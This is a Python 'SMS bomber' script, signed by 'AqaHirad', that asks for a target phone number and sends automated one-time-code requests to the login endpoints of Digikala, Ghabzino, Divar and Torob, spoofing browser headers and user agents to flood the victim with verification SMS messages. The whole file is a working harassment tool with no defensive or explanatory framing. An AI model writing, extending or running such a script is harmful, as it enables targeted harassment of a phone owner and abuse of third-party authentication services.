from requests import post,get
from user_agent import generate_user_agent
from colorama import Fore
from os import system , name

g = Fore.GREEN
w = Fore.WHITE
b = Fore.LIGHTBLACK_EX
r = Fore.RED
re = Fore.RESET

def divar(number):
    site = "https://api.divar.ir/v5/auth/authenticate"
    header = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.7",
        "Connection": "keep-alive",
        "Content-Length": "23",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "api.divar.ir",
        "Origin": "https://divar.ir",
        "Referer": "https://divar.ir/",
        "sec-ch-ua": '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Sec-GPC": "1",
        "User-Agent": generate_user_agent(os="linux"),
        "X-Standard-Divar-Error": "true"
    }
    data = {"phone":f"0+{number}"}
    divarr = post(url=site, json=data, headers=header)
    if divarr.status_code == 200:
        print(f'{g}({divarr.status_code}){w} Divar Sended !')
    else:
        print(f'{r}({divarr.status_code}){w} Divar Not Sended !')


def torob(number):
    site = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{number}"
    torobr = get(url=site)
    if torobr.status_code == 200:
        print(f'{g}({torobr.status_code}){w} Torob Send !')
    else:
        print(f'{r}({torobr.status_code}){w} Torob Not Send !')

def ghabzino(number):
    site = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
    data = {"Parameters": {"ApplicationType": "Web","ApplicationUniqueToken": None,"ApplicationVersion": "1.0.0","MobileNumber": f'0{number}'}}
    header = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','origin': 'https://ghabzino.com','referer': 'https://ghabzino.com/','user-agent': generate_user_agent(os="linux")}
    ghabzinor = post(url=site, json=data, headers=header)
    if ghabzinor.status_code == 200:
        print(f'{g}({ghabzinor.status_code}){w} Ghabzino Send !')
    else:
        print(f'{r}({ghabzinor.status_code}){w} Ghabzino Not Send !')

def digikala(number):
    site = 'https://api.digikala.com/v1/user/authenticate/'
    data = {"username": f'0{number}'}
    header = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Access-Control-Request-Headers": "content-type,x-web-client,x-web-optimize-response",
        "Access-Control-Request-Method": "POST",
        "Connection": "keep-alive",
        "Host": "api.digikala.com",
        "Origin": "https://www.digikala.com",
        "Referer": "https://www.digikala.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": generate_user_agent(os="linux")
    }
    digikalar = post(url=site, json=data, headers=header)
    if digikalar.status_code == 200:
        print(f'{g}({digikalar.status_code}){w} digikala Send !')
    else:
        print(f'{g}({digikalar.status_code}){w} digikala Not Send !')


system('cls' if name == 'nt' else 'clear')
bn = f"""

{Fore.RED}




┏┓   ┏┓  ┳┓     ┓   
┗┓┏┳┓┗┓  ┣┫┏┓┏┳┓┣┓┏┓
┗┛┛┗┗┗┛  ┻┛┗┛┛┗┗┗┛┛ 
   By AqaHirad{Fore.WHITE}                 

"""

print(bn)

phone = int(input(f'Phone Target {Fore.RED}> {Fore.WHITE}'))
system('cls' if name == 'nt' else 'clear')
print(bn)


digikala(phone)
ghabzino(phone)
divar(phone)
torob(phone)